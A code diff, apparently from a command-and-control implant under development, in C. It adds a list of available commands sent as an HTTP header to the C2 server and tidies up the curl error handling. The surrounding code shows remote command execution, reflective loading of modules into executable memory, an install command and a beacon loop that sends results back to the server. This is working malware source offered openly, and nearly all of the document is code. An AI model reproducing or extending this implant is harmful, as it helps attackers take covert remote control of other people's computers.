@@ -32,6 +32,9 @@ __declspec(dllexport) void MainExport(void);
 
 // Global used to send data back to the server
 char* STORED_RESPONSE = NULL;
+// Commands header info
+char* COMMANDS_HEADER = "Commands: ";
+char* AVAILABLE_COMMANDS = NULL;
 
 // Built-in Commands
 char* CMD_exec(char* args)
@@ -55,6 +58,9 @@ char* CMD_load(char* args)
     LPVOID lpBuffer = NULL;
     HANDLE hModule  = NULL;
 
+    if (module == NULL)
+        return NULL;
+    
     printf("Module: %p", module);
     printf("Module length: %zu\n", module_len);
     lpBuffer = VirtualAlloc(NULL, module_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -75,6 +81,8 @@ char* CMD_load(char* args)
     printf("Done with reflective test.\n");
 
     insertCommandNode(&commandList, createCommandNode(tester->command, tester->function));
+    if (AVAILABLE_COMMANDS) {free(AVAILABLE_COMMANDS); AVAILABLE_COMMANDS=NULL;}
+    AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
 
     printf("Inserted command!\n");
 
@@ -165,7 +173,13 @@ int main(void)
     insertCommandNode(&commandList, createCommandNode("quit", CMD_quit));
     insertCommandNode(&commandList, createCommandNode("install", CMD_install));
 
+    // Initialize available commands that the server returns; updated in `load` command
+    printf("Getting commands\n");
+    AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
+
     // Start C2
+    printf("Starting C2\n");
+
     jitter_connect();
 
     // End
@@ -222,11 +236,20 @@ void command_loop(void)
     chunk.size = 0;  // No data yet
     
     char* tmp = NULL;
-
     curl = curl_easy_init();
     if (curl)
     {
+        struct curl_slist *headers_list = NULL;
+        headers_list = curl_slist_append(headers_list, "clientid: 10");
+        headers_list = curl_slist_append(headers_list, AVAILABLE_COMMANDS);
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers_list);
         curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");
+
+        // For errors
+        char errbuf[CURL_ERROR_SIZE];
+        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);
+        errbuf[0] = 0;
 
         // If STORED_RESPONSE is not NULL, we have data to send to the server
         if (STORED_RESPONSE != NULL)
@@ -239,6 +262,8 @@ void command_loop(void)
         }
         else
         {
+            // No data to send to server, so perform a GET request
+            // curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "none");
         }
 
@@ -255,22 +280,30 @@ void command_loop(void)
         res = curl_easy_perform(curl);
         if (res != CURLE_OK)
         {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            size_t len = strlen(errbuf);
+            fprintf(stderr, "\nlibcurl: (%d) ", res);
+            if(len)
+            {
+                fprintf(stderr, "IF:%s%s", errbuf,((errbuf[len - 1] != '\n') ? "\n" : ""));
+            }
+            else
+            {
+                long response_code;
+                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+                fprintf(stderr, "ELSE:%s\n", curl_easy_strerror(res));
+                printf("Response code: %ld\n", response_code);
+            }
         }
         else
         {
-            // Get the response code if needed
-            long response_code;
-            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
-            printf("Response code: %ld\n", response_code);
             check_response(chunk.memory);
         }
 
         // Cleanup
-        if (tmp) {free(tmp);}
-        free(chunk.memory); // Always allocated
         curl_easy_cleanup(curl);
     }
+    if (tmp)          {free(tmp);}
+    if (chunk.memory) {free(chunk.memory);}
 }
 
 // Execute a command and capture its output. Cross-compilable for both Unix and Windows
